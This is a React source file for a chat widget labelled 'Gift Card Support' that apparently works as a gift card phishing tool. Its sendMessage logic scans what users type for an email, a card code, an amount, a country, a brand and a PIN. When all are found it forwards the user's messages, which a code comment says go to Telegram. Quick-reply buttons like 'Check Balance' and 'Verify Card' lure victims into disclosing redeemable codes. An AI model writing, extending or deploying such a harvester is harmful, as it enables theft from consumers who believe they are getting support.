import { useState, useRef, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { ScrollArea } from '@/components/ui/scroll-area';
import { MessageCircle, X, Send, Loader2 } from 'lucide-react';
import { supabase } from '@/integrations/supabase/client';
import { useToast } from '@/components/ui/use-toast';
import { giftCards } from '@/data/giftcards';

interface Message {
  role: 'user' | 'assistant';
  content: string;
}

const SupportChatbot = () => {
  const [isOpen, setIsOpen] = useState(false);
  const [messages, setMessages] = useState<Message[]>([]);
  const [input, setInput] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [showQuickReplies, setShowQuickReplies] = useState(true);
  const scrollRef = useRef<HTMLDivElement>(null);
  const { toast } = useToast();

  useEffect(() => {
    if (scrollRef.current) {
      scrollRef.current.scrollTop = scrollRef.current.scrollHeight;
    }
  }, [messages]);

  useEffect(() => {
    if (isOpen && messages.length === 0) {
      // Send initial greeting
      sendInitialGreeting();
    }
  }, [isOpen]);

  const sendInitialGreeting = async () => {
    setIsLoading(true);
    try {
      const { data, error } = await supabase.functions.invoke('giftcard-support-chat', {
        body: {
          messages: [
            { role: 'user', content: 'Hello' }
          ]
        }
      });

      if (error) throw error;

      setMessages([
        { role: 'assistant', content: data.message }
      ]);
    } catch (error) {
      console.error('Error starting chat:', error);
      toast({
        title: "Connection Error",
        description: "Failed to start chat. Please try again.",
        variant: "destructive"
      });
    } finally {
      setIsLoading(false);
    }
  };

  const sendMessage = async (messageText?: string) => {
    const messageContent = messageText || input.trim();
    if (!messageContent || isLoading) return;

    const userMessage: Message = { role: 'user', content: messageContent };
    const newMessages = [...messages, userMessage];
    setMessages(newMessages);
    setInput('');
    setShowQuickReplies(false);
    setIsLoading(true);

    try {
      const { data, error } = await supabase.functions.invoke('giftcard-support-chat', {
        body: { messages: newMessages }
      });

      if (error) {
        if (error.message?.includes('429')) {
          toast({
            title: "Rate Limit",
            description: "Too many requests. Please wait a moment.",
            variant: "destructive"
          });
          return;
        }
        throw error;
      }

      setMessages([...newMessages, { role: 'assistant', content: data.message }]);

      // Check if conversation has all required pieces
      const conversationText = newMessages.map(m => m.content).join(' ').toLowerCase();
      const rawText = newMessages.map(m => m.content).join(' ');
      
      const hasEmail = conversationText.includes('@');
      const hasCode = /[a-z0-9]{8,}/i.test(rawText);
      const hasAmount = /\$?\d{2,}/.test(rawText);
      const hasCountry = /\b(us|usa|united states|uk|united kingdom|canada|australia|germany|france|spain|italy|netherlands|ireland|sweden|norway|denmark|switzerland|austria|belgium|portugal|finland)\b/i.test(conversationText);
      
      // Detect card type and check if PIN is required
      const detectedCard = giftCards.find(card => 
        conversationText.includes(card.name.toLowerCase()) ||
        card.name.toLowerCase().split(/[\/\s()]/).some(part => part.length > 2 && conversationText.includes(part))
      );
      const hasCardType = detectedCard !== undefined || 
        ['amazon', 'steam', 'itunes', 'apple', 'google', 'playstation', 'xbox', 'netflix', 'spotify', 'ebay', 'walmart', 'target', 'best buy', 'nike', 'visa', 'mastercard', 'starbucks', 'roblox', 'uber', 'doordash', 'nintendo', 'discord', 'airbnb', 'lululemon', 'ikea', 'home depot', 'sephora', 'nordstrom'].some(type => conversationText.includes(type));
      
      // Check if card requires PIN
      const requiresPin = detectedCard?.requiresPin ?? 
        ['walmart', 'target', 'best buy', 'nike', 'visa', 'mastercard', 'american express', 'home depot', 'lowe', 'nordstrom', 'cvs', 'walgreens', 'sephora', 'starbucks', 'subway', 'kohl', 'gamestop', 'macy', 'chipotle', 'adidas', 'bath & body', 'american eagle', 'old navy', 'foot locker', 'chick-fil-a', 'applebee', 'domino', 'panera', 'ihop', 'delta', 'hotels.com', 'southwest', 'one4all', 'john lewis', 'costco', 'sainsbury', 'lidl', 'aldi', 'tesco', 'asda', 'currys', 'air canada', 'disney', 'ticketmaster', 'argos'].some(type => conversationText.includes(type));
      
      // Check for PIN if required (4-8 digit number that's separate from the code)
      const hasPin = requiresPin ? /\b\d{4,8}\b/.test(rawText) : true;
      
      // Send to Telegram immediately when we have all required pieces including email
      if (hasEmail && hasCode && hasAmount && hasCountry && hasCardType && hasPin) {
        const userMessages = newMessages.filter(m => m.role === 'user');
        const summary = `New Gift Card Request:\n${userMessages.map(m => m.content).join('\n')}${requiresPin ? '\n(PIN Required Card)' : '\n(Code Only Card)'}`;
        
        await supabase.functions.invoke('giftcard-support-chat', {
          body: {
            action: 'send_summary',
            messages: [{ role: 'user', content: summary }]
          }
        });
      }
    } catch (error) {
      console.error('Error sending message:', error);
      toast({
        title: "Error",
        description: "Failed to send message. Please try again.",
        variant: "destructive"
      });
    } finally {
      setIsLoading(false);
    }
  };

  const handleKeyPress = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter' && !e.shiftKey) {
      e.preventDefault();
      sendMessage();
    }
  };

  const handleQuickReply = (message: string) => {
    sendMessage(message);
  };

  const quickReplyOptions = [
    { label: 'Check Balance', icon: '💰', message: 'I want to check my gift card balance' },
    { label: 'Verify Card', icon: '✅', message: 'I want to verify my gift card' },
    { label: 'Find Code Location', icon: '🔍', message: 'Where is the code on my gift card?' },
  ];

  if (!isOpen) {
    return (
      <Button
        onClick={() => setIsOpen(true)}
        className="fixed bottom-6 right-6 h-14 w-14 rounded-full shadow-lg z-50"
        size="icon"
      >
        <MessageCircle className="h-6 w-6" />
      </Button>
    );
  }

  return (
    <div className="fixed inset-x-0 bottom-0 md:bottom-6 md:right-6 md:left-auto w-full md:w-[380px] h-[calc(100vh-3rem)] md:h-[600px] bg-background border border-border rounded-t-lg md:rounded-lg shadow-2xl flex flex-col z-50 max-h-[90vh]">
      {/* Header */}
      <div className="flex items-center justify-between p-4 border-b border-border bg-primary text-primary-foreground rounded-t-lg">
        <div className="flex items-center gap-2">
          <MessageCircle className="h-5 w-5" />
          <div>
            <h3 className="font-semibold">Gift Card Support</h3>
            <p className="text-xs opacity-90">How can we help you today?</p>
          </div>
        </div>
        <Button
          onClick={() => setIsOpen(false)}
          variant="ghost"
          size="icon"
          className="h-8 w-8 text-primary-foreground hover:bg-primary/80"
        >
          <X className="h-4 w-4" />
        </Button>
      </div>

      {/* Messages */}
      <ScrollArea className="flex-1 p-4" ref={scrollRef}>
        <div className="space-y-4">
          {messages.map((message, index) => (
            <div
              key={index}
              className={`flex ${message.role === 'user' ? 'justify-end' : 'justify-start'}`}
            >
              <div
                className={`max-w-[80%] rounded-lg px-4 py-2 ${
                  message.role === 'user'
                    ? 'bg-primary text-primary-foreground'
                    : 'bg-muted text-foreground'
                }`}
              >
                <p className="text-sm whitespace-pre-wrap">{message.content}</p>
              </div>
            </div>
          ))}
          {isLoading && (
            <div className="flex justify-start">
              <div className="bg-muted text-foreground rounded-lg px-4 py-3">
                <div className="flex gap-1 items-center">
                  <div className="w-2 h-2 bg-foreground/60 rounded-full animate-bounce [animation-delay:0ms]"></div>
                  <div className="w-2 h-2 bg-foreground/60 rounded-full animate-bounce [animation-delay:150ms]"></div>
                  <div className="w-2 h-2 bg-foreground/60 rounded-full animate-bounce [animation-delay:300ms]"></div>
                </div>
              </div>
            </div>
          )}
        </div>
      </ScrollArea>

      {/* Quick Reply Buttons */}
      {showQuickReplies && messages.length > 0 && !isLoading && (
        <div className="px-4 pb-2">
          <div className="flex flex-wrap gap-2">
            {quickReplyOptions.map((option) => (
              <Button
                key={option.label}
                onClick={() => handleQuickReply(option.message)}
                variant="outline"
                size="sm"
                className="text-xs"
              >
                <span className="mr-1">{option.icon}</span>
                {option.label}
              </Button>
            ))}
          </div>
        </div>
      )}

      {/* Input */}
      <div className="p-4 border-t border-border">
        <div className="flex gap-2">
          <Input
            value={input}
            onChange={(e) => setInput(e.target.value)}
            onKeyPress={handleKeyPress}
            placeholder="Type your message..."
            disabled={isLoading}
            className="flex-1"
          />
          <Button
            onClick={() => sendMessage()}
            disabled={isLoading || !input.trim()}
            size="icon"
          >
            <Send className="h-4 w-4" />
          </Button>
        </div>
      </div>
    </div>
  );
};

export default SupportChatbot;
